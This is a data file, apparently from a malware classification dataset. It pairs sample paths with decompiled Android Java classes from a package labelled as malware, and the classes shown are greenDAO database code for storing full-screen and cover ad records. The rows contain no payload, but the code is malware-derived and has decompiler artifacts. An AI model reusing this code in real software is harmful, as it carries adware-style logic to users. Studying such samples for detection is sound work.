(failureActionInfo.getAction() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (failureActionInfo.getCount() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String packageName=failureActionInfo.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(5,packageName);     }     String appName=failureActionInfo.getAppName();     if (appName != null) {       sQLiteStatement.bindString(6,appName);     }     String date=failureActionInfo.getDate();     if (date != null) {       sQLiteStatement.bindString(7,date);     }   }   @Override public Void getKey(  FailureActionInfo failureActionInfo){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public FailureActionInfo readEntity(  Cursor cursor,  int i){     return new FailureActionInfo(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)),cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6));   }   @Override public void readEntity(  Cursor cursor,  FailureActionInfo failureActionInfo,  int i){     failureActionInfo.setAdType(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)));     failureActionInfo.setAdId(cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)));     failureActionInfo.setAction(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     failureActionInfo.setCount(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     failureActionInfo.setPackageName(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     failureActionInfo.setAppName(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     failureActionInfo.setDate(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  FailureActionInfo failureActionInfo,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\FullCoverAd.code","public class FullCoverAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private Long expires;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private Integer showStyle;   private Integer showTime;   private String tablePlaqueImg;   private String url;   private String wifiSwitches;   public FullCoverAd(){   }   public FullCoverAd(  Long l){     this.id=l;   }   public FullCoverAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  Integer num4,  String str14){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.showTime=num3;     this.showStyle=num4;     this.tablePlaqueImg=str14;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public Integer getShowStyle(){     return this.showStyle;   }   public Integer getShowTime(){     return this.showTime;   }   public String getTablePlaqueImg(){     return this.tablePlaqueImg;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setShowStyle(  Integer num){     this.showStyle=num;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setTablePlaqueImg(  String str){     this.tablePlaqueImg=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\FullCoverAdDao.code","public class FullCoverAdDao extends AbstractDao<FullCoverAd,Long> {   public static final String TABLENAME=""FULL_COVER_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");     public static final Property ShowStyle=new Property(18,Integer.class,""showStyle"",false,""SHOW_STYLE"");     public static final Property TablePlaqueImg=new Property(19,String.class,""tablePlaqueImg"",false,""TABLE_PLAQUE_IMG"");   }   public FullCoverAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public FullCoverAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'FULL_COVER_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'SHOW_TIME' INTEGER,'SHOW_STYLE' INTEGER,'TABLE_PLAQUE_IMG' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'FULL_COVER_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  FullCoverAd fullCoverAd){     sQLiteStatement.clearBindings();     Long id=fullCoverAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=fullCoverAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (fullCoverAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (fullCoverAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=fullCoverAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=fullCoverAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=fullCoverAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=fullCoverAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=fullCoverAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=fullCoverAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=fullCoverAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=fullCoverAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=fullCoverAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=fullCoverAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=fullCoverAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=fullCoverAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=fullCoverAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (fullCoverAd.getShowTime() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     if (fullCoverAd.getShowStyle() != null) {       sQLiteStatement.bindLong(19,r0.intValue());     }     String tablePlaqueImg=fullCoverAd.getTablePlaqueImg();     if (tablePlaqueImg != null) {       sQLiteStatement.bindString(20,tablePlaqueImg);     }   }   @Override public Long getKey(  FullCoverAd fullCoverAd){     if (fullCoverAd != null) {       return fullCoverAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public FullCoverAd readEntity(  Cursor cursor,  int i){     return new FullCoverAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)),cursor.isNull(i + 19) ? null : cursor.getString(i + 19));   }   @Override public void readEntity(  Cursor cursor,  FullCoverAd fullCoverAd,  int i){     fullCoverAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     fullCoverAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     fullCoverAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     fullCoverAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     fullCoverAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     fullCoverAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     fullCoverAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     fullCoverAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     fullCoverAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     fullCoverAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     fullCoverAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     fullCoverAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     fullCoverAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     fullCoverAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     fullCoverAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     fullCoverAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     fullCoverAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     fullCoverAd.setShowTime(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     fullCoverAd.setShowStyle(cursor.isNull(i + 18) ? null : Integer.valueOf(cursor.getInt(i + 18)));     fullCoverAd.setTablePlaqueImg(cursor.isNull(i + 19) ? null : cursor.getString(i + 19));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  FullCoverAd fullCoverAd,  long j){     fullCoverAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\FullScreenAd.code","public class FullScreenAd {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private Long expires;   private String fullScreenImg;   private String g2Switches;   private String g3Switches;   private String icon;   private Long id;   private String intro;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private Integer showTime;   private String url;   private String wifiSwitches;   public FullScreenAd(){   }   public FullScreenAd(  Long l){     this.id=l;   }   public FullScreenAd(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  String str14){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.showTime=num3;     this.fullScreenImg=str14;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getFullScreenImg(){     return this.fullScreenImg;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public Integer getShowTime(){     return this.showTime;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setFullScreenImg(  String str){     this.fullScreenImg=str;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setShowTime(  Integer num){     this.showTime=num;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\FullScreenAdDao.code","public class FullScreenAdDao extends AbstractDao<FullScreenAd,Long> {   public static final String TABLENAME=""FULL_SCREEN_AD""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new Property(8,String.class,""intro"",false,""INTRO"");     public static final Property AppSize=new Property(9,String.class,""appSize"",false,""APP_SIZE"");     public static final Property AppVersion=new Property(10,String.class,""appVersion"",false,""APP_VERSION"");     public static final Property Icon=new Property(11,String.class,""icon"",false,""ICON"");     public static final Property Printscreen=new Property(12,String.class,""printscreen"",false,""PRINTSCREEN"");     public static final Property G2Switches=new Property(13,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(14,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(15,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property ShowPeriod=new Property(16,String.class,""showPeriod"",false,""SHOW_PERIOD"");     public static final Property ShowTime=new Property(17,Integer.class,""showTime"",false,""SHOW_TIME"");     public static final Property FullScreenImg=new Property(18,String.class,""fullScreenImg"",false,""FULL_SCREEN_IMG"");   }   public FullScreenAdDao(  DaoConfig daoConfig){     super(daoConfig);   }   public FullScreenAdDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""CREATE TABLE "" + (z ? ""IF NOT EXISTS "" : """") + ""'FULL_SCREEN_AD' ('_id' INTEGER PRIMARY KEY AUTOINCREMENT ,'EXPIRES' INTEGER,'AD_ID' INTEGER,'KIND' INTEGER,'URL' TEXT,'RECOMMEND' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'INTRO' TEXT,'APP_SIZE' TEXT,'APP_VERSION' TEXT,'ICON' TEXT,'PRINTSCREEN' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'SHOW_PERIOD' TEXT,'SHOW_TIME' INTEGER,'FULL_SCREEN_IMG' TEXT);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'FULL_SCREEN_AD'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  FullScreenAd fullScreenAd){     sQLiteStatement.clearBindings();     Long id=fullScreenAd.getId();     if (id != null) {       sQLiteStatement.bindLong(1,id.longValue());     }     Long expires=fullScreenAd.getExpires();     if (expires != null) {       sQLiteStatement.bindLong(2,expires.longValue());     }     if (fullScreenAd.getAdId() != null) {       sQLiteStatement.bindLong(3,r0.intValue());     }     if (fullScreenAd.getKind() != null) {       sQLiteStatement.bindLong(4,r0.intValue());     }     String url=fullScreenAd.getUrl();     if (url != null) {       sQLiteStatement.bindString(5,url);     }     String recommend=fullScreenAd.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(6,recommend);     }     String packageName=fullScreenAd.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(7,packageName);     }     String appName=fullScreenAd.getAppName();     if (appName != null) {       sQLiteStatement.bindString(8,appName);     }     String intro=fullScreenAd.getIntro();     if (intro != null) {       sQLiteStatement.bindString(9,intro);     }     String appSize=fullScreenAd.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(10,appSize);     }     String appVersion=fullScreenAd.getAppVersion();     if (appVersion != null) {       sQLiteStatement.bindString(11,appVersion);     }     String icon=fullScreenAd.getIcon();     if (icon != null) {       sQLiteStatement.bindString(12,icon);     }     String printscreen=fullScreenAd.getPrintscreen();     if (printscreen != null) {       sQLiteStatement.bindString(13,printscreen);     }     String g2Switches=fullScreenAd.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(14,g2Switches);     }     String g3Switches=fullScreenAd.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(15,g3Switches);     }     String wifiSwitches=fullScreenAd.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(16,wifiSwitches);     }     String showPeriod=fullScreenAd.getShowPeriod();     if (showPeriod != null) {       sQLiteStatement.bindString(17,showPeriod);     }     if (fullScreenAd.getShowTime() != null) {       sQLiteStatement.bindLong(18,r0.intValue());     }     String fullScreenImg=fullScreenAd.getFullScreenImg();     if (fullScreenImg != null) {       sQLiteStatement.bindString(19,fullScreenImg);     }   }   @Override public Long getKey(  FullScreenAd fullScreenAd){     if (fullScreenAd != null) {       return fullScreenAd.getId();     }     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public FullScreenAd readEntity(  Cursor cursor,  int i){     return new FullScreenAd(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)),cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)),cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : cursor.getString(i + 10),cursor.isNull(i + 11) ? null : cursor.getString(i + 11),cursor.isNull(i + 12) ? null : cursor.getString(i + 12),cursor.isNull(i + 13) ? null : cursor.getString(i + 13),cursor.isNull(i + 14) ? null : cursor.getString(i + 14),cursor.isNull(i + 15) ? null : cursor.getString(i + 15),cursor.isNull(i + 16) ? null : cursor.getString(i + 16),cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)),cursor.isNull(i + 18) ? null : cursor.getString(i + 18));   }   @Override public void readEntity(  Cursor cursor,  FullScreenAd fullScreenAd,  int i){     fullScreenAd.setId(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     fullScreenAd.setExpires(cursor.isNull(i + 1) ? null : Long.valueOf(cursor.getLong(i + 1)));     fullScreenAd.setAdId(cursor.isNull(i + 2) ? null : Integer.valueOf(cursor.getInt(i + 2)));     fullScreenAd.setKind(cursor.isNull(i + 3) ? null : Integer.valueOf(cursor.getInt(i + 3)));     fullScreenAd.setUrl(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     fullScreenAd.setRecommend(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     fullScreenAd.setPackageName(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     fullScreenAd.setAppName(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     fullScreenAd.setIntro(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     fullScreenAd.setAppSize(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     fullScreenAd.setAppVersion(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     fullScreenAd.setIcon(cursor.isNull(i + 11) ? null : cursor.getString(i + 11));     fullScreenAd.setPrintscreen(cursor.isNull(i + 12) ? null : cursor.getString(i + 12));     fullScreenAd.setG2Switches(cursor.isNull(i + 13) ? null : cursor.getString(i + 13));     fullScreenAd.setG3Switches(cursor.isNull(i + 14) ? null : cursor.getString(i + 14));     fullScreenAd.setWifiSwitches(cursor.isNull(i + 15) ? null : cursor.getString(i + 15));     fullScreenAd.setShowPeriod(cursor.isNull(i + 16) ? null : cursor.getString(i + 16));     fullScreenAd.setShowTime(cursor.isNull(i + 17) ? null : Integer.valueOf(cursor.getInt(i + 17)));     fullScreenAd.setFullScreenImg(cursor.isNull(i + 18) ? null : cursor.getString(i + 18));   }   @Override public Long readKey(  Cursor cursor,  int i){     if (cursor.isNull(i + 0)) {       return null;     }     return Long.valueOf(cursor.getLong(i + 0));   }   @Override public Long updateKeyAfterInsert(  FullScreenAd fullScreenAd,  long j){     fullScreenAd.setId(Long.valueOf(j));     return Long.valueOf(j);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\HotAppAdInfo.code","public class HotAppAdInfo {   private Integer adId;   private String appName;   private String appSize;   private String appVersion;   private Long expires;   private String g2Switches;   private String g3Switches;   private Integer hasBoundAd;   private String icon;   private Long id;   private String intro;   private Integer isRecommend;   private Integer kind;   private String packageName;   private String printscreen;   private String recommend;   private String showPeriod;   private String url;   private String wifiSwitches;   public HotAppAdInfo(){   }   public HotAppAdInfo(  Long l){     this.id=l;   }   public HotAppAdInfo(  Long l,  Long l2,  Integer num,  Integer num2,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  String str10,  String str11,  String str12,  String str13,  Integer num3,  Integer num4){     this.id=l;     this.expires=l2;     this.adId=num;     this.kind=num2;     this.url=str;     this.recommend=str2;     this.packageName=str3;     this.appName=str4;     this.intro=str5;     this.appSize=str6;     this.appVersion=str7;     this.icon=str8;     this.printscreen=str9;     this.g2Switches=str10;     this.g3Switches=str11;     this.wifiSwitches=str12;     this.showPeriod=str13;     this.hasBoundAd=num3;     this.isRecommend=num4;   }   public Integer getAdId(){     return this.adId;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public String getAppVersion(){     return this.appVersion;   }   public Long getExpires(){     return this.expires;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public Integer getHasBoundAd(){     return this.hasBoundAd;   }   public String getIcon(){     return this.icon;   }   public Long getId(){     return this.id;   }   public String getIntro(){     return this.intro;   }   public Integer getIsRecommend(){     return this.isRecommend;   }   public Integer getKind(){     return this.kind;   }   public String getPackageName(){     return this.packageName;   }   public String getPrintscreen(){     return this.printscreen;   }   public String getRecommend(){     return this.recommend;   }   public String getShowPeriod(){     return this.showPeriod;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setAppVersion(  String str){     this.appVersion=str;   }   public void setExpires(  Long l){     this.expires=l;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setHasBoundAd(  Integer num){     this.hasBoundAd=num;   }   public void setIcon(  String str){     this.icon=str;   }   public void setId(  Long l){     this.id=l;   }   public void setIntro(  String str){     this.intro=str;   }   public void setIsRecommend(  Integer num){     this.isRecommend=num;   }   public void setKind(  Integer num){     this.kind=num;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setPrintscreen(  String str){     this.printscreen=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setShowPeriod(  String str){     this.showPeriod=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\HotAppAdInfoDao.code","public class HotAppAdInfoDao extends AbstractDao<HotAppAdInfo,Long> {   public static final String TABLENAME=""HOT_APP_AD_INFO""; public class Properties {     public static final Property Id=new Property(0,Long.class,""id"",true,""_id"");     public static final Property Expires=new Property(1,Long.class,""expires"",false,""EXPIRES"");     public static final Property AdId=new Property(2,Integer.class,""adId"",false,""AD_ID"");     public static final Property Kind=new Property(3,Integer.class,""kind"",false,""KIND"");     public static final Property Url=new Property(4,String.class,""url"",false,""URL"");     public static final Property Recommend=new Property(5,String.class,""recommend"",false,""RECOMMEND"");     public static final Property PackageName=new Property(6,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(7,String.class,""appName"",false,""APP_NAME"");     public static final Property Intro=new 